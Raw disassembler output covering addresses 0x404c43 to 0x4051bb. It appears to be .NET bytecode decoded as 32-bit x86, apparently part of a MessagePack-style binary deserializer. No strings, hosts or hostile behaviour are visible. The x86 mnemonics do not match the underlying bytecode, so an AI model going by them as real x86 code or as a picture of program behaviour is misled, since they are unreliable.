  404c43:	14 0c                	adc    $0xc,%al
  404c45:	07                   	pop    %es
  404c46:	8e 3a                	mov    (%edx),%?
  404c48:	02 00                	add    (%eax),%al
  404c4a:	00 00                	add    %al,(%eax)
  404c4c:	14 2a                	adc    $0x2a,%al
  404c4e:	07                   	pop    %es
  404c4f:	8e 69 17             	mov    0x17(%ecx),%gs
  404c52:	3e 41                	ds inc %ecx
  404c54:	00 00                	add    %al,(%eax)
  404c56:	00 16                	add    %dl,(%esi)
  404c58:	0d 38 32 00 00       	or     $0x3238,%eax
  404c5d:	00 07                	add    %al,(%edi)
  404c5f:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c65:	0c 06                	or     $0x6,%al
  404c67:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c6a:	00 00                	add    %al,(%eax)
  404c6c:	06                   	push   %es
  404c6d:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c70:	04 3a                	add    $0x3a,%al
  404c72:	13 00                	adc    (%eax),%eax
  404c74:	00 00                	add    %al,(%eax)
  404c76:	06                   	push   %es
  404c77:	6f                   	outsl  %ds:(%esi),(%dx)
  404c78:	6f                   	outsl  %ds:(%esi),(%dx)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	0a 06                	or     (%esi),%al
  404c7e:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c81:	00 00                	add    %al,(%eax)
  404c83:	06                   	push   %es
  404c84:	38 03                	cmp    %al,(%ebx)
  404c86:	00 00                	add    %al,(%eax)
  404c88:	00 11                	add    %dl,(%ecx)
  404c8a:	04 0a                	add    $0xa,%al
  404c8c:	09 17                	or     %edx,(%edi)
  404c8e:	58                   	pop    %eax
  404c8f:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c94:	17                   	pop    %ss
  404c95:	59                   	pop    %ecx
  404c96:	32 c6                	xor    %dh,%al
  404c98:	07                   	pop    %es
  404c99:	07                   	pop    %es
  404c9a:	8e 69 17             	mov    0x17(%ecx),%gs
  404c9d:	59                   	pop    %ecx
  404c9e:	a3 38 00 00 01       	mov    %eax,0x1000038
  404ca3:	0c 06                	or     $0x6,%al
  404ca5:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca8:	00 00                	add    %al,(%eax)
  404caa:	06                   	push   %es
  404cab:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404cb1:	0e                   	push   %cs
  404cb2:	00 00                	add    %al,(%eax)
  404cb4:	00 06                	add    %al,(%esi)
  404cb6:	7b 38                	jnp    0x404cf0
  404cb8:	00 00                	add    %al,(%eax)
  404cba:	04 11                	add    $0x11,%al
  404cbc:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cc1:	0a 2a                	or     (%edx),%ch
  404cc3:	06                   	push   %es
  404cc4:	6f                   	outsl  %ds:(%esi),(%dx)
  404cc5:	6f                   	outsl  %ds:(%esi),(%dx)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	0a 06                	or     (%esi),%al
  404ccb:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cce:	00 00                	add    %al,(%eax)
  404cd0:	06                   	push   %es
  404cd1:	06                   	push   %es
  404cd2:	2a 00                	sub    (%eax),%al
  404cd4:	1b 30                	sbb    (%eax),%esi
  404cd6:	04 00                	add    $0x0,%al
  404cd8:	3b 00                	cmp    (%eax),%eax
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	24 00                	and    $0x0,%al
  404cde:	00 11                	add    %dl,(%ecx)
  404ce0:	73 d0                	jae    0x404cb2
  404ce2:	00 00                	add    %al,(%eax)
  404ce4:	0a 0a                	or     (%edx),%cl
  404ce6:	03 28                	add    (%eax),%ebp
  404ce8:	a2 00 00 06 10       	mov    %al,0x10060000
  404ced:	01 06                	add    %eax,(%esi)
  404cef:	03 16                	add    (%esi),%edx
  404cf1:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cf7:	00 0a                	add    %cl,(%edx)
  404cf9:	06                   	push   %es
  404cfa:	16                   	push   %ss
  404cfb:	6a 6f                	push   $0x6f
  404cfd:	4e                   	dec    %esi
  404cfe:	00 00                	add    %al,(%eax)
  404d00:	0a 02                	or     (%edx),%al
  404d02:	06                   	push   %es
  404d03:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d09:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d0e:	39 06                	cmp    %eax,(%esi)
  404d10:	00 00                	add    %al,(%eax)
  404d12:	00 06                	add    %al,(%esi)
  404d14:	6f                   	outsl  %ds:(%esi),(%dx)
  404d15:	33 00                	xor    (%eax),%eax
  404d17:	00 0a                	add    %cl,(%edx)
  404d19:	dc 2a                	fsubrl (%edx)
  404d1b:	00 01                	add    %al,(%ecx)
  404d1d:	10 00                	adc    %al,(%eax)
  404d1f:	00 02                	add    %al,(%edx)
  404d21:	00 06                	add    %al,(%esi)
  404d23:	00 27                	add    %ah,(%edi)
  404d25:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d2a:	00 00                	add    %al,(%eax)
  404d2c:	13 30                	adc    (%eax),%esi
  404d2e:	02 00                	add    (%eax),%al
  404d30:	16                   	push   %ss
  404d31:	00 00                	add    %al,(%eax)
  404d33:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d39:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d3c:	00 00                	add    %al,(%eax)
  404d3e:	0a 0a                	or     (%edx),%cl
  404d40:	02 06                	add    (%esi),%al
  404d42:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d48:	6f                   	outsl  %ds:(%esi),(%dx)
  404d49:	40                   	inc    %eax
  404d4a:	00 00                	add    %al,(%eax)
  404d4c:	0a 2a                	or     (%edx),%ch
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	13 30                	adc    (%eax),%esi
  404d52:	04 00                	add    $0x0,%al
  404d54:	07                   	pop    %es
  404d55:	06                   	push   %es
  404d56:	00 00                	add    %al,(%eax)
  404d58:	26 00 00             	add    %al,%es:(%eax)
  404d5b:	11 03                	adc    %eax,(%ebx)
  404d5d:	6f                   	outsl  %ds:(%esi),(%dx)
  404d5e:	00 01                	add    %al,(%ecx)
  404d60:	00 0a                	add    %cl,(%edx)
  404d62:	d2 0a                	rorb   %cl,(%edx)
  404d64:	14 0b                	adc    $0xb,%al
  404d66:	16                   	push   %ss
  404d67:	0c 16                	or     $0x16,%al
  404d69:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d6e:	09 00                	or     %eax,(%eax)
  404d70:	00 00                	add    %al,(%eax)
  404d72:	02 06                	add    (%esi),%al
  404d74:	6e                   	outsb  %ds:(%esi),(%dx)
  404d75:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d79:	06                   	push   %es
  404d7a:	2a 06                	sub    (%esi),%al
  404d7c:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d82:	48                   	dec    %eax
  404d83:	00 00                	add    %al,(%eax)
  404d85:	00 06                	add    %al,(%esi)
  404d87:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d8d:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d92:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d95:	00 06                	add    %al,(%esi)
  404d97:	02 18                	add    (%eax),%bl
  404d99:	7d 36                	jge    0x404dd1
  404d9b:	00 00                	add    %al,(%eax)
  404d9d:	04 06                	add    $0x6,%al
  404d9f:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404da5:	0c 16                	or     $0x16,%al
  404da7:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404dac:	00 02                	add    %al,(%edx)
  404dae:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404db2:	06                   	push   %es
  404db3:	25 03 28 96 00       	and    $0x962803,%eax
  404db8:	00 06                	add    %al,(%esi)
  404dba:	6f                   	outsl  %ds:(%esi),(%dx)
  404dbb:	6a 00                	push   $0x0
  404dbd:	00 06                	add    %al,(%esi)
  404dbf:	03 6f 88             	add    -0x78(%edi),%ebp
  404dc2:	00 00                	add    %al,(%eax)
  404dc4:	06                   	push   %es
  404dc5:	09 17                	or     %edx,(%edi)
  404dc7:	58                   	pop    %eax
  404dc8:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dcd:	2a 06                	sub    (%esi),%al
  404dcf:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dd5:	3c 00                	cmp    $0x0,%al
  404dd7:	00 00                	add    %al,(%eax)
  404dd9:	06                   	push   %es
  404dda:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404de0:	31 00                	xor    %eax,(%eax)
  404de2:	00 00                	add    %al,(%eax)
  404de4:	02 28                	add    (%eax),%ch
  404de6:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de9:	06                   	push   %es
  404dea:	02 19                	add    (%ecx),%bl
  404dec:	7d 36                	jge    0x404e24
  404dee:	00 00                	add    %al,(%eax)
  404df0:	04 06                	add    $0x6,%al
  404df2:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df8:	0c 16                	or     $0x16,%al
  404dfa:	0d 38 10 00 00       	or     $0x1038,%eax
  404dff:	00 02                	add    %al,(%edx)
  404e01:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404e05:	06                   	push   %es
  404e06:	03 6f 88             	add    -0x78(%edi),%ebp
  404e09:	00 00                	add    %al,(%eax)
  404e0b:	06                   	push   %es
  404e0c:	09 17                	or     %edx,(%edi)
  404e0e:	58                   	pop    %eax
  404e0f:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e14:	2a 06                	sub    (%esi),%al
  404e16:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e1c:	21 00                	and    %eax,(%eax)
  404e1e:	00 00                	add    %al,(%eax)
  404e20:	06                   	push   %es
  404e21:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e27:	16                   	push   %ss
  404e28:	00 00                	add    %al,(%eax)
  404e2a:	00 06                	add    %al,(%esi)
  404e2c:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e32:	0c 02                	or     $0x2,%al
  404e34:	03 08                	add    (%eax),%ecx
  404e36:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e3c:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e42:	20 e0                	and    %ah,%al
  404e44:	00 00                	add    %al,(%eax)
  404e46:	00 3f                	add    %bh,(%edi)
  404e48:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e4d:	20 ff                	and    %bh,%bh
  404e4f:	00 00                	add    %al,(%eax)
  404e51:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e57:	02 06                	add    (%esi),%al
  404e59:	67 6a 28             	addr16 push $0x28
  404e5c:	74 00                	je     0x404e5e
  404e5e:	00 06                	add    %al,(%esi)
  404e60:	2a 06                	sub    (%esi),%al
  404e62:	20 c0                	and    %al,%al
  404e64:	00 00                	add    %al,(%eax)
  404e66:	00 40 07             	add    %al,0x7(%eax)
  404e69:	00 00                	add    %al,(%eax)
  404e6b:	00 02                	add    %al,(%edx)
  404e6d:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e73:	06                   	push   %es
  404e74:	20 c1                	and    %al,%cl
  404e76:	00 00                	add    %al,(%eax)
  404e78:	00 40 0b             	add    %al,0xb(%eax)
  404e7b:	00 00                	add    %al,(%eax)
  404e7d:	00 72 78             	add    %dh,0x78(%edx)
  404e80:	27                   	daa
  404e81:	00 70 73             	add    %dh,0x73(%eax)
  404e84:	01 01                	add    %eax,(%ecx)
  404e86:	00 0a                	add    %cl,(%edx)
  404e88:	7a 06                	jp     0x404e90
  404e8a:	20 c2                	and    %al,%dl
  404e8c:	00 00                	add    %al,(%eax)
  404e8e:	00 40 08             	add    %al,0x8(%eax)
  404e91:	00 00                	add    %al,(%eax)
  404e93:	00 02                	add    %al,(%edx)
  404e95:	16                   	push   %ss
  404e96:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e9c:	06                   	push   %es
  404e9d:	20 c3                	and    %al,%bl
  404e9f:	00 00                	add    %al,(%eax)
  404ea1:	00 40 08             	add    %al,0x8(%eax)
  404ea4:	00 00                	add    %al,(%eax)
  404ea6:	00 02                	add    %al,(%edx)
  404ea8:	17                   	pop    %ss
  404ea9:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404eaf:	06                   	push   %es
  404eb0:	20 c4                	and    %al,%ah
  404eb2:	00 00                	add    %al,(%eax)
  404eb4:	00 40 20             	add    %al,0x20(%eax)
  404eb7:	00 00                	add    %al,(%eax)
  404eb9:	00 03                	add    %al,(%ebx)
  404ebb:	6f                   	outsl  %ds:(%esi),(%dx)
  404ebc:	00 01                	add    %al,(%ecx)
  404ebe:	00 0a                	add    %cl,(%edx)
  404ec0:	0c 08                	or     $0x8,%al
  404ec2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ec6:	01 0b                	add    %ecx,(%ebx)
  404ec8:	03 07                	add    (%edi),%eax
  404eca:	16                   	push   %ss
  404ecb:	08 6f 45             	or     %ch,0x45(%edi)
  404ece:	00 00                	add    %al,(%eax)
  404ed0:	0a 26                	or     (%esi),%ah
  404ed2:	02 07                	add    (%edi),%al
  404ed4:	28 79 00             	sub    %bh,0x0(%ecx)
  404ed7:	00 06                	add    %al,(%esi)
  404ed9:	2a 06                	sub    (%esi),%al
  404edb:	20 c5                	and    %al,%ch
  404edd:	00 00                	add    %al,(%eax)
  404edf:	00 40 39             	add    %al,0x39(%eax)
  404ee2:	00 00                	add    %al,(%eax)
  404ee4:	00 18                	add    %bl,(%eax)
  404ee6:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404eea:	01 0b                	add    %ecx,(%ebx)
  404eec:	03 07                	add    (%edi),%eax
  404eee:	16                   	push   %ss
  404eef:	18 6f 45             	sbb    %ch,0x45(%edi)
  404ef2:	00 00                	add    %al,(%eax)
  404ef4:	0a 26                	or     (%esi),%ah
  404ef6:	07                   	pop    %es
  404ef7:	28 58 00             	sub    %bl,0x0(%eax)
  404efa:	00 06                	add    %al,(%esi)
  404efc:	0b 07                	or     (%edi),%eax
  404efe:	16                   	push   %ss
  404eff:	28 02                	sub    %al,(%edx)
  404f01:	01 00                	add    %eax,(%eax)
  404f03:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f06:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f0a:	01 0b                	add    %ecx,(%ebx)
  404f0c:	03 07                	add    (%edi),%eax
  404f0e:	16                   	push   %ss
  404f0f:	08 6f 45             	or     %ch,0x45(%edi)
  404f12:	00 00                	add    %al,(%eax)
  404f14:	0a 26                	or     (%esi),%ah
  404f16:	02 07                	add    (%edi),%al
  404f18:	28 79 00             	sub    %bh,0x0(%ecx)
  404f1b:	00 06                	add    %al,(%esi)
  404f1d:	2a 06                	sub    (%esi),%al
  404f1f:	20 c6                	and    %al,%dh
  404f21:	00 00                	add    %al,(%eax)
  404f23:	00 40 39             	add    %al,0x39(%eax)
  404f26:	00 00                	add    %al,(%eax)
  404f28:	00 1a                	add    %bl,(%edx)
  404f2a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f2e:	01 0b                	add    %ecx,(%ebx)
  404f30:	03 07                	add    (%edi),%eax
  404f32:	16                   	push   %ss
  404f33:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f36:	00 00                	add    %al,(%eax)
  404f38:	0a 26                	or     (%esi),%ah
  404f3a:	07                   	pop    %es
  404f3b:	28 58 00             	sub    %bl,0x0(%eax)
  404f3e:	00 06                	add    %al,(%esi)
  404f40:	0b 07                	or     (%edi),%eax
  404f42:	16                   	push   %ss
  404f43:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f47:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f4a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f4e:	01 0b                	add    %ecx,(%ebx)
  404f50:	03 07                	add    (%edi),%eax
  404f52:	16                   	push   %ss
  404f53:	08 6f 45             	or     %ch,0x45(%edi)
  404f56:	00 00                	add    %al,(%eax)
  404f58:	0a 26                	or     (%esi),%ah
  404f5a:	02 07                	add    (%edi),%al
  404f5c:	28 79 00             	sub    %bh,0x0(%ecx)
  404f5f:	00 06                	add    %al,(%esi)
  404f61:	2a 06                	sub    (%esi),%al
  404f63:	20 c7                	and    %al,%bh
  404f65:	00 00                	add    %al,(%eax)
  404f67:	00 3b                	add    %bh,(%ebx)
  404f69:	16                   	push   %ss
  404f6a:	00 00                	add    %al,(%eax)
  404f6c:	00 06                	add    %al,(%esi)
  404f6e:	20 c8                	and    %cl,%al
  404f70:	00 00                	add    %al,(%eax)
  404f72:	00 3b                	add    %bh,(%ebx)
  404f74:	0b 00                	or     (%eax),%eax
  404f76:	00 00                	add    %al,(%eax)
  404f78:	06                   	push   %es
  404f79:	20 c9                	and    %cl,%cl
  404f7b:	00 00                	add    %al,(%eax)
  404f7d:	00 40 0b             	add    %al,0xb(%eax)
  404f80:	00 00                	add    %al,(%eax)
  404f82:	00 72 a4             	add    %dh,-0x5c(%edx)
  404f85:	27                   	daa
  404f86:	00 70 73             	add    %dh,0x73(%eax)
  404f89:	01 01                	add    %eax,(%ecx)
  404f8b:	00 0a                	add    %cl,(%edx)
  404f8d:	7a 06                	jp     0x404f95
  404f8f:	20 ca                	and    %cl,%dl
  404f91:	00 00                	add    %al,(%eax)
  404f93:	00 40 26             	add    %al,0x26(%eax)
  404f96:	00 00                	add    %al,(%eax)
  404f98:	00 1a                	add    %bl,(%edx)
  404f9a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f9e:	01 0b                	add    %ecx,(%ebx)
  404fa0:	03 07                	add    (%edi),%eax
  404fa2:	16                   	push   %ss
  404fa3:	1a 6f 45             	sbb    0x45(%edi),%ch
  404fa6:	00 00                	add    %al,(%eax)
  404fa8:	0a 26                	or     (%esi),%ah
  404faa:	07                   	pop    %es
  404fab:	28 58 00             	sub    %bl,0x0(%eax)
  404fae:	00 06                	add    %al,(%esi)
  404fb0:	0b 02                	or     (%edx),%eax
  404fb2:	07                   	pop    %es
  404fb3:	16                   	push   %ss
  404fb4:	28 03                	sub    %al,(%ebx)
  404fb6:	01 00                	add    %eax,(%eax)
  404fb8:	0a 28                	or     (%eax),%ch
  404fba:	84 00                	test   %al,(%eax)
  404fbc:	00 06                	add    %al,(%esi)
  404fbe:	2a 06                	sub    (%esi),%al
  404fc0:	20 cb                	and    %cl,%bl
  404fc2:	00 00                	add    %al,(%eax)
  404fc4:	00 40 26             	add    %al,0x26(%eax)
  404fc7:	00 00                	add    %al,(%eax)
  404fc9:	00 1e                	add    %bl,(%esi)
  404fcb:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fcf:	01 0b                	add    %ecx,(%ebx)
  404fd1:	03 07                	add    (%edi),%eax
  404fd3:	16                   	push   %ss
  404fd4:	1e                   	push   %ds
  404fd5:	6f                   	outsl  %ds:(%esi),(%dx)
  404fd6:	45                   	inc    %ebp
  404fd7:	00 00                	add    %al,(%eax)
  404fd9:	0a 26                	or     (%esi),%ah
  404fdb:	07                   	pop    %es
  404fdc:	28 58 00             	sub    %bl,0x0(%eax)
  404fdf:	00 06                	add    %al,(%esi)
  404fe1:	0b 02                	or     (%edx),%eax
  404fe3:	07                   	pop    %es
  404fe4:	16                   	push   %ss
  404fe5:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe8:	00 0a                	add    %cl,(%edx)
  404fea:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404ff0:	06                   	push   %es
  404ff1:	20 cc                	and    %cl,%ah
  404ff3:	00 00                	add    %al,(%eax)
  404ff5:	00 40 11             	add    %al,0x11(%eax)
  404ff8:	00 00                	add    %al,(%eax)
  404ffa:	00 03                	add    %al,(%ebx)
  404ffc:	6f                   	outsl  %ds:(%esi),(%dx)
  404ffd:	00 01                	add    %al,(%ecx)
  404fff:	00 0a                	add    %cl,(%edx)
  405001:	d2 0a                	rorb   %cl,(%edx)
  405003:	02 06                	add    (%esi),%al
  405005:	6e                   	outsb  %ds:(%esi),(%dx)
  405006:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  40500a:	06                   	push   %es
  40500b:	2a 06                	sub    (%esi),%al
  40500d:	20 cd                	and    %cl,%ch
  40500f:	00 00                	add    %al,(%eax)
  405011:	00 40 27             	add    %al,0x27(%eax)
  405014:	00 00                	add    %al,(%eax)
  405016:	00 18                	add    %bl,(%eax)
  405018:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40501c:	01 0b                	add    %ecx,(%ebx)
  40501e:	03 07                	add    (%edi),%eax
  405020:	16                   	push   %ss
  405021:	18 6f 45             	sbb    %ch,0x45(%edi)
  405024:	00 00                	add    %al,(%eax)
  405026:	0a 26                	or     (%esi),%ah
  405028:	07                   	pop    %es
  405029:	28 58 00             	sub    %bl,0x0(%eax)
  40502c:	00 06                	add    %al,(%esi)
  40502e:	0b 02                	or     (%edx),%eax
  405030:	07                   	pop    %es
  405031:	16                   	push   %ss
  405032:	28 02                	sub    %al,(%edx)
  405034:	01 00                	add    %eax,(%eax)
  405036:	0a 6e 28             	or     0x28(%esi),%ch
  405039:	74 00                	je     0x40503b
  40503b:	00 06                	add    %al,(%esi)
  40503d:	2a 06                	sub    (%esi),%al
  40503f:	20 ce                	and    %cl,%dh
  405041:	00 00                	add    %al,(%eax)
  405043:	00 40 27             	add    %al,0x27(%eax)
  405046:	00 00                	add    %al,(%eax)
  405048:	00 1a                	add    %bl,(%edx)
  40504a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40504e:	01 0b                	add    %ecx,(%ebx)
  405050:	03 07                	add    (%edi),%eax
  405052:	16                   	push   %ss
  405053:	1a 6f 45             	sbb    0x45(%edi),%ch
  405056:	00 00                	add    %al,(%eax)
  405058:	0a 26                	or     (%esi),%ah
  40505a:	07                   	pop    %es
  40505b:	28 58 00             	sub    %bl,0x0(%eax)
  40505e:	00 06                	add    %al,(%esi)
  405060:	0b 02                	or     (%edx),%eax
  405062:	07                   	pop    %es
  405063:	16                   	push   %ss
  405064:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  40506a:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  40506e:	06                   	push   %es
  40506f:	2a 06                	sub    (%esi),%al
  405071:	20 cf                	and    %cl,%bh
  405073:	00 00                	add    %al,(%eax)
  405075:	00 40 26             	add    %al,0x26(%eax)
  405078:	00 00                	add    %al,(%eax)
  40507a:	00 1e                	add    %bl,(%esi)
  40507c:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405080:	01 0b                	add    %ecx,(%ebx)
  405082:	03 07                	add    (%edi),%eax
  405084:	16                   	push   %ss
  405085:	1e                   	push   %ds
  405086:	6f                   	outsl  %ds:(%esi),(%dx)
  405087:	45                   	inc    %ebp
  405088:	00 00                	add    %al,(%eax)
  40508a:	0a 26                	or     (%esi),%ah
  40508c:	07                   	pop    %es
  40508d:	28 58 00             	sub    %bl,0x0(%eax)
  405090:	00 06                	add    %al,(%esi)
  405092:	0b 02                	or     (%edx),%eax
  405094:	07                   	pop    %es
  405095:	16                   	push   %ss
  405096:	28 06                	sub    %al,(%esi)
  405098:	01 00                	add    %eax,(%eax)
  40509a:	0a 28                	or     (%eax),%ch
  40509c:	75 00                	jne    0x40509e
  40509e:	00 06                	add    %al,(%esi)
  4050a0:	2a 06                	sub    (%esi),%al
  4050a2:	20 dc                	and    %bl,%ah
  4050a4:	00 00                	add    %al,(%eax)
  4050a6:	00 40 49             	add    %al,0x49(%eax)
  4050a9:	00 00                	add    %al,(%eax)
  4050ab:	00 18                	add    %bl,(%eax)
  4050ad:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050b1:	01 0b                	add    %ecx,(%ebx)
  4050b3:	03 07                	add    (%edi),%eax
  4050b5:	16                   	push   %ss
  4050b6:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b9:	00 00                	add    %al,(%eax)
  4050bb:	0a 26                	or     (%esi),%ah
  4050bd:	07                   	pop    %es
  4050be:	28 58 00             	sub    %bl,0x0(%eax)
  4050c1:	00 06                	add    %al,(%esi)
  4050c3:	0b 07                	or     (%edi),%eax
  4050c5:	16                   	push   %ss
  4050c6:	28 07                	sub    %al,(%edi)
  4050c8:	01 00                	add    %eax,(%eax)
  4050ca:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050cd:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050d0:	00 06                	add    %al,(%esi)
  4050d2:	02 19                	add    (%ecx),%bl
  4050d4:	7d 36                	jge    0x40510c
  4050d6:	00 00                	add    %al,(%eax)
  4050d8:	04 16                	add    $0x16,%al
  4050da:	0d 38 10 00 00       	or     $0x1038,%eax
  4050df:	00 02                	add    %al,(%edx)
  4050e1:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050e5:	06                   	push   %es
  4050e6:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e9:	00 00                	add    %al,(%eax)
  4050eb:	06                   	push   %es
  4050ec:	09 17                	or     %edx,(%edi)
  4050ee:	58                   	pop    %eax
  4050ef:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050f4:	2a 06                	sub    (%esi),%al
  4050f6:	20 dd                	and    %bl,%ch
  4050f8:	00 00                	add    %al,(%eax)
  4050fa:	00 40 49             	add    %al,0x49(%eax)
  4050fd:	00 00                	add    %al,(%eax)
  4050ff:	00 1a                	add    %bl,(%edx)
  405101:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405105:	01 0b                	add    %ecx,(%ebx)
  405107:	03 07                	add    (%edi),%eax
  405109:	16                   	push   %ss
  40510a:	1a 6f 45             	sbb    0x45(%edi),%ch
  40510d:	00 00                	add    %al,(%eax)
  40510f:	0a 26                	or     (%esi),%ah
  405111:	07                   	pop    %es
  405112:	28 58 00             	sub    %bl,0x0(%eax)
  405115:	00 06                	add    %al,(%esi)
  405117:	0b 07                	or     (%edi),%eax
  405119:	16                   	push   %ss
  40511a:	28 07                	sub    %al,(%edi)
  40511c:	01 00                	add    %eax,(%eax)
  40511e:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405121:	28 6b 00             	sub    %ch,0x0(%ebx)
  405124:	00 06                	add    %al,(%esi)
  405126:	02 19                	add    (%ecx),%bl
  405128:	7d 36                	jge    0x405160
  40512a:	00 00                	add    %al,(%eax)
  40512c:	04 16                	add    $0x16,%al
  40512e:	0d 38 10 00 00       	or     $0x1038,%eax
  405133:	00 02                	add    %al,(%edx)
  405135:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405139:	06                   	push   %es
  40513a:	03 6f 88             	add    -0x78(%edi),%ebp
  40513d:	00 00                	add    %al,(%eax)
  40513f:	06                   	push   %es
  405140:	09 17                	or     %edx,(%edi)
  405142:	58                   	pop    %eax
  405143:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405148:	2a 06                	sub    (%esi),%al
  40514a:	20 d9                	and    %bl,%cl
  40514c:	00 00                	add    %al,(%eax)
  40514e:	00 40 0e             	add    %al,0xe(%eax)
  405151:	00 00                	add    %al,(%eax)
  405153:	00 02                	add    %al,(%edx)
  405155:	06                   	push   %es
  405156:	03 28                	add    (%eax),%ebp
  405158:	97                   	xchg   %eax,%edi
  405159:	00 00                	add    %al,(%eax)
  40515b:	06                   	push   %es
  40515c:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  405162:	06                   	push   %es
  405163:	20 de                	and    %bl,%dh
  405165:	00 00                	add    %al,(%eax)
  405167:	00 40 55             	add    %al,0x55(%eax)
  40516a:	00 00                	add    %al,(%eax)
  40516c:	00 18                	add    %bl,(%eax)
  40516e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405172:	01 0b                	add    %ecx,(%ebx)
  405174:	03 07                	add    (%edi),%eax
  405176:	16                   	push   %ss
  405177:	18 6f 45             	sbb    %ch,0x45(%edi)
  40517a:	00 00                	add    %al,(%eax)
  40517c:	0a 26                	or     (%esi),%ah
  40517e:	07                   	pop    %es
  40517f:	28 58 00             	sub    %bl,0x0(%eax)
  405182:	00 06                	add    %al,(%esi)
  405184:	0b 07                	or     (%edi),%eax
  405186:	16                   	push   %ss
  405187:	28 07                	sub    %al,(%edi)
  405189:	01 00                	add    %eax,(%eax)
  40518b:	0a 0c 02             	or     (%edx,%eax,1),%cl
  40518e:	28 6b 00             	sub    %ch,0x0(%ebx)
  405191:	00 06                	add    %al,(%esi)
  405193:	02 18                	add    (%eax),%bl
  405195:	7d 36                	jge    0x4051cd
  405197:	00 00                	add    %al,(%eax)
  405199:	04 16                	add    $0x16,%al
  40519b:	0d 38 1c 00 00       	or     $0x1c38,%eax
  4051a0:	00 02                	add    %al,(%edx)
  4051a2:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4051a6:	06                   	push   %es
  4051a7:	25 03 28 96 00       	and    $0x962803,%eax
  4051ac:	00 06                	add    %al,(%esi)
  4051ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4051af:	6a 00                	push   $0x0
  4051b1:	00 06                	add    %al,(%esi)
  4051b3:	03 6f 88             	add    -0x78(%edi),%ebp
  4051b6:	00 00                	add    %al,(%eax)
  4051b8:	06                   	push   %es
  4051b9:	09 17                	or     %edx,(%edi)
  4051bb:	58                   	pop    %eax
